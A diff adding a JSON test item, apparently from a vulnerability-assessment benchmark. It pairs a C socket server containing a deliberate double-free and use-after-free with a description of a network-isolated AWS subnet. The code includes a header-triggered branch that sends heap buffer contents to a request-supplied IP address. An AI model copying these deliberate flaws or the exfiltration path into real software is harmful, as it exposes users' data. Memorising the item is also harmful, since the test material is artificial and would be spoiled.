@@ -1,0 +1,42 @@
+{
+  "id": "234f116e",
+  "language": "c",
+  "code": "#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#define BUFFER_SIZE 4096\n#define MAX_SESSIONS 256\n\ntypedef struct {\n    char *request_buf;\n    char *response_buf;\n    int socket_fd;\n    int authenticated;\n    size_t content_length;\n} session_t;\n\nstatic session_t *sessions[MAX_SESSIONS];\n\nvoid cleanup_session(int idx) {\n    if (idx < 0 || idx >= MAX_SESSIONS) return;\n    session_t *s = sessions[idx];\n    if (!s) return;\n    \n    if (s->request_buf) {\n        free(s->request_buf);\n    }\n    if (s->response_buf) {\n        free(s->response_buf);\n    }\n    free(s);\n    /* BUG: sessions[idx] not set to NULL */\n}\n\nint handle_disconnect(int idx) {\n    cleanup_session(idx);\n    /* Caller may also call cleanup on error paths */\n    return 0;\n}\n\nint process_request(int idx, const char *data, size_t len) {\n    session_t *s = sessions[idx];\n    if (!s) return -1;\n    \n    /* Parse HTTP-like request */\n    if (len > BUFFER_SIZE) len = BUFFER_SIZE;\n    memcpy(s->request_buf, data, len);\n    \n    /* Check for admin command that triggers session reset */\n    if (strstr(s->request_buf, \"X-Reset-Session: true\")) {\n        /* First free via reset path */\n        cleanup_session(idx);\n        /* Attempt to reallocate - but cleanup_session already freed */\n        sessions[idx] = (session_t *)malloc(sizeof(session_t));\n        if (!sessions[idx]) return -1;\n        sessions[idx]->request_buf = (char *)malloc(BUFFER_SIZE);\n        sessions[idx]->response_buf = (char *)malloc(BUFFER_SIZE);\n        sessions[idx]->authenticated = 0;\n        return 0;\n    }\n    \n    /* Exfiltrate sensitive data over network if authenticated */\n    if (s->authenticated && strstr(s->request_buf, \"X-Exfil: true\")) {\n        int sock = socket(AF_INET, SOCK_STREAM, 0);\n        struct sockaddr_in dest;\n        dest.sin_family = AF_INET;\n        dest.sin_port = htons(8443);\n        inet_pton(AF_INET, s->request_buf + 32, &dest.sin_addr);\n        \n        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {\n            /* Send heap contents that may contain secrets from other sessions */\n            send(sock, s->response_buf, BUFFER_SIZE, 0);\n        }\n        close(sock);\n        return 0;\n    }\n    \n    return 0;\n}\n\nint handle_error(int idx, int error_code) {\n    fprintf(stderr, \"Session %d error: %d\\n\", idx, error_code);\n    /* Second free via error handling path - DOUBLE FREE */\n    cleanup_session(idx);\n    return -1;\n}\n\nint main(int argc, char **argv) {\n    int server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr = {0};\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8080);\n    addr.sin_addr.s_addr = INADDR_ANY;\n    \n    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));\n    listen(server_fd, 128);\n    \n    printf(\"Legacy monolith listening on :8080\\n\");\n    \n    while (1) {\n        struct sockaddr_in client;\n        socklen_t clen = sizeof(client);\n        int cfd = accept(server_fd, (struct sockaddr *)&client, &clen);\n        if (cfd < 0) continue;\n        \n        int idx = cfd % MAX_SESSIONS;\n        sessions[idx] = (session_t *)malloc(sizeof(session_t));\n        sessions[idx]->request_buf = (char *)malloc(BUFFER_SIZE);\n        sessions[idx]->response_buf = (char *)malloc(BUFFER_SIZE);\n        sessions[idx]->socket_fd = cfd;\n        sessions[idx]->authenticated = 0;\n        sessions[idx]->content_length = 0;\n        \n        char buf[BUFFER_SIZE];\n        ssize_t n = recv(cfd, buf, sizeof(buf), 0);\n        if (n > 0) {\n            int rc = process_request(idx, buf, n);\n            if (rc < 0) {\n                handle_error(idx, rc);\n            }\n        } else {\n            handle_disconnect(idx);\n            handle_error(idx, -1); /* Double free triggered here */\n        }\n        close(cfd);\n    }\n    return 0;\n}",
+  "environment": {
+    "description": "EC2 c5.xlarge instance running identical Amazon Linux 2 AMI in a private subnet (10.0.2.0/24). The subnet's route table has local routes only (10.0.0.0/16 -> local) with no route entry for 0.0.0.0/0 \u2014 no Internet Gateway association, no NAT Gateway, no NAT instance, no VPC peering to any subnet with egress, no Transit Gateway attachment. Security group egress rules allow only TCP 5432 to 10.0.2.50/32 (RDS endpoint). VPC has no VPC endpoints for S3, SSM, or any AWS service that could proxy traffic. Network ACL on the subnet explicitly denies all traffic to destinations outside 10.0.0.0/16 (rule 50: DENY all protocols 0.0.0.0/0 outbound, rule 100: ALLOW TCP 5432 10.0.2.50/32 outbound). DNS resolution is VPC-internal only (enableDnsSupport=true, no Route53 outbound resolver endpoints). Instance has no public IP, no Elastic IP. The binary is compiled identically (-O2 -fno-stack-protector) and glibc 2.26 tcache is present \u2014 the double-free IS triggerable and heap corruption DOES occur.",
+    "config": {
+      "vpc_cidr": "10.0.0.0/16",
+      "subnet": "10.0.2.0/24 (private, isolated)",
+      "internet_gateway": false,
+      "nat_gateway": false,
+      "nat_instance": false,
+      "vpc_peering": "none",
+      "transit_gateway": "none",
+      "route_table_entries": [
+        "10.0.0.0/16 -> local"
+      ],
+      "security_group_egress": "TCP 5432 to 10.0.2.50/32 only",
+      "nacl_outbound": [
+        {
+          "rule": 50,
+          "action": "DENY",
+          "protocol": "all",
+          "destination": "0.0.0.0/0"
+        },
+        {
+          "rule": 100,
+          "action": "ALLOW",
+          "protocol": "TCP",
+          "port": 5432,
+          "destination": "10.0.2.50/32"
+        }
+      ],
+      "vpc_endpoints": "none",
+      "public_ip": false,
+      "elastic_ip": false,
+      "dns_config": "VPC-internal only, no outbound resolver",
+      "compiler_flags": "-O2 -fno-stack-protector",
+      "glibc_version": "2.26"
+    }
+  }
+}
